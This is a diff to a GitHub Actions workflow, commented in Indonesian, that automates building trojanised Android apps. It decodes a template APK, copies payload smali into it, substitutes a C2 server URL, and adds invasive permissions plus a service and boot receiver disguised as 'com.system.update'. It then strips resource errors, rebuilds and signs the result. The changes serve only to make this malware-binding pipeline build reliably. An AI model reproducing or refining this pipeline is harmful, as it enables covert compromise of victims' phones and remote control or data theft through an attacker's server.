@@ -7,10 +7,10 @@ on:
         description: 'Build ID'
         required: true
       app_name:
-        description: 'Nama Aplikasi (akan muncul di strings.xml)'
+        description: 'Nama Aplikasi'
         required: true
       package_name:
-        description: 'Nama Paket (HANYA UNTUK PAYLOAD, TIDAK UNTUK TEMPLATE!)'
+        description: 'Nama Paket (UNTUK PAYLOAD)'
         required: true
       c2_url:
         description: 'URL Server C2'
@@ -68,7 +68,6 @@ jobs:
           TEMPLATE_FILE="templates/${{ inputs.bind_target }}.apk"
           if [ ! -f "$TEMPLATE_FILE" ]; then
             echo "❌ ERROR: File template tidak ditemukan: $TEMPLATE_FILE"
-            echo "📌 Pastikan file APK ada di templates/"
             exit 1
           fi
           echo "✅ Menggunakan template lokal: $TEMPLATE_FILE"
@@ -83,25 +82,26 @@ jobs:
       - name: Decode template APK
         run: java -jar /usr/local/bin/apktool.jar d template.apk -o decoded/
 
+      - name: Install framework resource
+        run: |
+          # 🔥 PASANG FRAMEWORK UNTUK KENALI RESOURCE ID
+          java -jar /usr/local/bin/apktool.jar if template.apk || true
+
       - name: Inject payload smali
         run: |
-          # 🔥 SALIN PAYLOAD SMALI KE DALAM TEMPLATE (TANPA UBAH PACKAGE NAME TEMPLATE)
           if [ -d "payload/smali" ]; then
             cp -r payload/smali/* decoded/smali/
           fi
 
       - name: Replace C2 URL in payload smali
         run: |
-          # 🔥 GANTI URL C2 DI SEMUA FILE SMALI PAYLOAD
           find decoded/smali -name "*.smali" -exec sed -i "s|https://your-server.com|${{ inputs.c2_url }}|g" {} \; || true
-          echo "✅ URL C2 diganti di smali payload"
+          echo "✅ URL C2 diganti"
 
       - name: Add permissions and service to AndroidManifest.xml
         run: |
-          # 🔥 TAMBAHKAN IZIN DAN SERVICE KE MANIFEST (TANPA UBAH PACKAGE NAME)
           MANIFEST="decoded/AndroidManifest.xml"
-          
-          # Izin tambahan
+          # Izin
           sed -i '/<manifest/a\
           <uses-permission android:name="android.permission.INTERNET" />\
           <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />\
@@ -114,7 +114,7 @@ jobs:
           <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />\
           <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />' $MANIFEST
           
-          # Service dan receiver
+          # Service
           sed -i '/<application/a\
           <service android:name="com.system.update.UpdateService" android:exported="false" android:foregroundServiceType="dataSync" />\
           <receiver android:name="com.system.update.BootReceiver" android:exported="true">\
@@ -124,9 +124,19 @@ jobs:
             </intent-filter>\
           </receiver>' $MANIFEST
 
-      - name: Rebuild APK (tanpa resource compilation)
+      - name: Clean dummy files and references
         run: |
-          # 🔥 BUILD TANPA KOMPILASI RESOURCE AGAR TIDAK ERROR DUMMY
+          # 🔥 HAPUS SEMUA FILE DUMMYVAL
+          find decoded -name "*DUMMYVAL*" -type f -delete 2>/dev/null || true
+          # 🔥 HAPUS SEMUA REFERENSI DUMMYVAL DARI XML
+          find decoded -name "*.xml" -exec sed -i '/DUMMYVAL/d' {} \; 2>/dev/null || true
+          # 🔥 HAPUS public.xml (sering jadi sumber error)
+          find decoded -name "public.xml" -delete 2>/dev/null || true
+          echo "✅ DUMMYVAL berhasil dibersihkan"
+
+      - name: Rebuild APK
+        run: |
+          # 🔥 BUILD TANPA RESOURCE COMPILATION
           java -jar /usr/local/bin/apktool.jar b decoded -o unsigned.apk -b
 
       - name: Sign APK
